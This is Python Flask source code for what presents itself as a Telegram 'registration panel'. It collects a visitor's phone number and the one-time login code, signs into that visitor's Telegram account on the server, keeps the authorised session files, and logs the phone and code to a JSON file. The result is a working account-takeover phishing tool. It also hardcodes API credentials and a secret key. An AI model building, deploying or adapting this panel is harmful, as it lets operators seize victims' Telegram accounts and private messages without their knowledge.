"""
پنل ثبت‌نام - نسخه نهایی بدون asyncio
"""

import os
import json
import time
from flask import Flask, render_template, request, jsonify, session
from telethon.sync import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError

app = Flask(__name__)
app.secret_key = 'mew_secret_key_2026'

# ========== تنظیمات ==========
API_ID = 17187664
API_HASH = 'd6eae2c921342bb71816a980dc11b9f5'
USERS_FILE = 'users.json'
SESSIONS_DIR = 'sessions/'
TEMP_SESSIONS = {}

# ========== مدیریت فایل‌ها ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def get_user_count():
    users = load_users()
    return len(users)

# ========== مسیرها ==========
@app.route('/')
def index():
    return render_template('register.html', user_count=get_user_count())

@app.route('/api/users/count')
def users_count():
    return jsonify({'count': get_user_count()})

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone', '').strip()
    
    if not phone.startswith('+') or not phone[1:].isdigit():
        return jsonify({'success': False, 'message': '❌ شماره باید با + شروع شود!'})
    
    try:
        # ایجاد کلاینت جدید
        session_file = f"{SESSIONS_DIR}temp_{int(time.time())}"
        client = TelegramClient(session_file, API_ID, API_HASH)
        client.connect()
        
        # ارسال کد
        client.send_code_request(phone)
        
        # ذخیره کلاینت
        session_id = str(int(time.time()))
        TEMP_SESSIONS[session_id] = {
            'client': client,
            'phone': phone,
            'timestamp': time.time()
        }
        
        session['temp_id'] = session_id
        session['phone'] = phone
        
        return jsonify({'success': True, 'message': f'✅ کد تایید به {phone} ارسال شد!'})
        
    except FloodWaitError as e:
        return jsonify({'success': False, 'message': f'⏳ صبر کنید {e.seconds} ثانیه!'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    code = request.form.get('code', '').strip()
    temp_id = session.get('temp_id')
    phone = session.get('phone')
    
    if not temp_id or temp_id not in TEMP_SESSIONS:
        return jsonify({'success': False, 'message': '❌ نشست منقضی شده! دوباره تلاش کنید.'})
    
    if not code.isdigit() or len(code) != 5:
        return jsonify({'success': False, 'message': '❌ کد باید ۵ رقم باشد!'})
    
    try:
        temp_data = TEMP_SESSIONS[temp_id]
        client = temp_data['client']
        
        # تایید کد با sign_in
        try:
            client.sign_in(code=code)
        except PhoneCodeInvalidError:
            return jsonify({'success': False, 'message': '❌ کد نادرست! دوباره تلاش کنید.'})
        except SessionPasswordNeededError:
            return jsonify({'success': False, 'message': '🔐 2FA فعال است! رمز دوم را وارد کنید.'})
        
        # دریافت اطلاعات کاربر
        me = client.get_me()
        
        if not me:
            return jsonify({'success': False, 'message': '❌ خطا در دریافت اطلاعات کاربر!'})
        
        users = load_users()
        user_id = str(int(time.time()))
        
        users[user_id] = {
            'phone': phone,
            'code': code,
            'status': 'pending',
            'registered_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'username': me.username or 'نامشخص',
            'first_name': me.first_name or 'کاربر',
            'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
        }
        save_users(users)
        
        # بستن کلاینت
        client.disconnect()
        del TEMP_SESSIONS[temp_id]
        session.clear()
        
        return jsonify({
            'success': True,
            'message': f'✅ ثبت‌نام موفق! خوش آمدی @{me.username or me.first_name}',
            'user': {
                'name': me.first_name or 'کاربر',
                'username': me.username or 'نامشخص',
                'phone': phone
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

# ========== اجرا ==========
if __name__ == "__main__":
    # ساخت پوشه‌ها
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    app.run(host='0.0.0.0', port=10000, debug=False, threaded=True)
